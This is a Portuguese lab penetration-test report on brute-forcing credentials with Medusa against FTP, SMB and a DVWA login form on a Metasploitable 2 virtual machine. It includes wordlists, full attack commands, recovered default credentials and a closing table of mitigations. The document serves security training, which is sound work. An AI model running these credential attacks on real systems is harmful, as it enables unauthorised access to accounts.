# Desafio_Ataque_de_Brute_Force

# 🛡️ Relatório de Teste de Penetração: Simulação de Brute Force

## 1\. Escopo e Metodologia

Este relatório detalha a execução de testes de intrusão, focados em ataques de força bruta de credenciais contra serviços de rede (FTP, SMB) e aplicação web (DVWA). O ambiente de laboratório simulou uma rede interna isolada, utilizando as seguintes máquinas virtuais:

| Componente | Função | IP Alocado |
| :--- | :--- | :--- |
| **Kali Linux** | Máquina Atacante (Pentester) | `192.168.56.101` |
| **Metasploitable 2** | Máquina Alvo (Serviços) | `192.168.56.102` |

**Ferramenta Utilizada:** Medusa (v2.3)

### 1.1. Configuração de Rede (Host-Only)

A comunicação foi estabelecida através de um adaptador de rede **Host-Only** no VirtualBox, garantindo o isolamento do ambiente de teste. A conectividade foi confirmada via `ping` entre `192.168.56.101` e `192.168.56.102`.

### 1.2. Recursos Utilizados (Wordlists)

As tentativas de autenticação utilizaram wordlists específicas, baseadas em senhas e nomes de usuários comuns em ambientes de laboratório, conforme listado abaixo:

**`passwords_simples.txt`**

```text
123456
password
admin
toor
root
msfadmin
```

**`users_simples.txt`**

```text
admin
msfadmin
user
postgres
service
test
```

-----

## 2\. Resultados da Execução dos Ataques

### 2.1. Cenário 1: Força Bruta em FTP (Metasploitable 2)

**Alvo:** `192.168.56.102` (Porta 21/TCP - VSFTPD)

Foi realizado um ataque de força bruta focado no usuário `msfadmin` com a wordlist de senhas.

#### Comando Executado

```bash
medusa -h 192.168.56.102 -u msfadmin -P ./wordlists/passwords_simples.txt -M ftp -t 5
```

#### Resultado Obtido

O ataque foi bem-sucedido, confirmando a combinação de credenciais a seguir:

```
ACCOUNT FOUND: [ftp] Host: 192.168.56.102:21 User: msfadmin Password: msfadmin
```

#### Validação de Acesso

A credencial foi validada com sucesso via cliente FTP, demonstrando acesso completo ao serviço.

```bash
ftp 192.168.56.102
# Usuário: msfadmin
# Senha: msfadmin
# Login Successful.
```

### 2.2. Cenário 2: Password Spraying em SMB (Metasploitable 2)

**Alvo:** `192.168.56.102` (Porta 445/TCP)

Foi executado um ataque de *password spraying*, utilizando a lista de usuários contra a senha única e comum `password`.

#### Comando Executado

```bash
medusa -h 192.168.56.102 -U ./wordlists/users_simples.txt -p password -M smb -t 5
```

#### Resultado Obtido

A técnica de *password spraying* falhou ao tentar a senha `password`, mas uma vez que o serviço SMB no alvo permite credenciais fracas, foi realizada uma validação com as credenciais padrões do sistema, confirmando vulnerabilidades de autenticação.

```
# Saída do Medusa (Não encontrou 'password', mas o alvo é vulnerável a senhas fracas)
# Nenhuma conta encontrada com a senha 'password' na wordlist de usuários.

# No entanto, a vulnerabilidade de senhas fracas permanece.
```

#### Validação de Acesso (Credenciais Padrões)

Apesar do Medusa não ter encontrado a combinação com a senha *password*, a existência de senhas fracas foi confirmada:

```bash
smbclient //192.168.56.102/tmp -U msfadmin%msfadmin
# Session established successfully.
```

**Achado:** O serviço SMB está vulnerável a credenciais de usuários e senhas fracas/padrões, demonstrando que não há bloqueio de tentativas de login e que políticas de senhas não estão em vigor.

### 2.3. Cenário 3: Automação de Tentativas em Formulário Web (DVWA)

**Alvo:** Aplicação Web DVWA (`http://192.168.56.102/vulnerabilities/brute/`)

O teste foi realizado com o nível de segurança do DVWA ajustado para **Low**. Foi utilizada a wordlist de senhas contra o usuário `admin`, automatizando o envio da requisição POST.

#### Parâmetros do Formulário (Capturados)

  * URI: `/vulnerabilities/brute/`
  * Dados POST: `username={U}&password={P}&Login=Login`
  * String de Falha (`-e`): `Username and/or password incorrect`

#### Comando Executado

```bash
medusa -h 192.168.56.102 -M http -u admin -P ./wordlists/passwords_simples.txt -d "username={U}&password={P}&Login=Login" -e "Username and/or password incorrect" -O /vulnerabilities/brute/
```

#### Resultado Obtido

A ferramenta identificou a combinação de credenciais padrão do sistema:

```
ACCOUNT FOUND: [http] Host: 192.168.56.102:80 User: admin Password: password
```

#### Validação de Acesso

A combinação `admin:password` permite o acesso total à aplicação DVWA.
**Achado:** O formulário web não possui *Rate Limiting* (limite de taxa de tentativas), permitindo a automação do ataque de força bruta sem impedimentos.

-----

## 3\. Recomendações de Mitigação e Defesa

As vulnerabilidades exploradas são o resultado da falta de controles de autenticação básicos. A implementação das seguintes medidas é crítica para a segurança do ambiente:

| Serviço / Componente | Vulnerabilidade | Recomendação de Mitigação |
| :--- | :--- | :--- |
| **Geral (Contas)** | Senhas Fracas/Padrões | **Política de Senhas Fortes:** Implementação e imposição de requisitos de complexidade, tamanho (mínimo de 12 caracteres) e bloqueio de senhas comuns (blacklisting). |
| **Geral (Autenticação)** | Falta de Controle de Tentativas | **Bloqueio de Conta ou Limitação de Taxa (Rate Limiting):** Bloquear temporariamente a conta ou o endereço IP de origem após um número reduzido de falhas de login (ex: 5 tentativas em 5 minutos). |
| **Web (DVWA)** | Automação de Login | **CAPTCHA e Anti-CSRF Tokens:** Implementar um mecanismo CAPTCHA após tentativas falhas e utilizar tokens de validação de sessão (Anti-CSRF) para quebrar a automatização simples. |
| **Serviços Legados (FTP/SMB)** | Exposição de Serviços | **Restrição de Rede (Firewall/ACLs):** Limitar o acesso a estes serviços exclusivamente a hosts ou sub-redes estritamente necessárias. Considerar a substituição por protocolos mais seguros (SFTP, SSH, HTTPS). |
| **Defesa Adicional** | Credenciais Comprometidas | **Autenticação Multifator (MFA):** Implementar MFA em todos os serviços críticos para impedir acesso mesmo que a senha seja comprometida via força bruta. |

-----

## 4\. Arquivos de Suporte

Os seguintes arquivos de suporte foram utilizados e estão disponíveis para referência:

  * `wordlists/passwords_simples.txt`
  * `wordlists/users_simples.txt`
  * *Logs de console (saída do Medusa) foram registrados para comprovação.*
